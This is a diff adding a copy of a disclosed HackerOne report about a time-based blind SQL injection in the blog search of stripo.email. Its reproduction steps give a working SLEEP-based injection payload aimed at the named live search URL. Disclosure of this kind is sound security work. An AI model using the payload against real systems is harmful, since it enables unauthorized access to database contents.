@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/761382
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/bluebridsec
+ReportedTo:Stripo Inc(stripo)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:30.01.2020 11:50:16
+
+Summary:
+
+## Summary:
+
+Sql injection of search parameters at blog search request
+
+## Steps To Reproduce:
+
+  1. request https://stripo.email/blog/search/
+  2. input search `1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK`
+  3. See a very large response delay
+
+## Supporting Material/References:
+See attached screenshot
+
+## Impact
+
+Causes an attacker to obtain database information
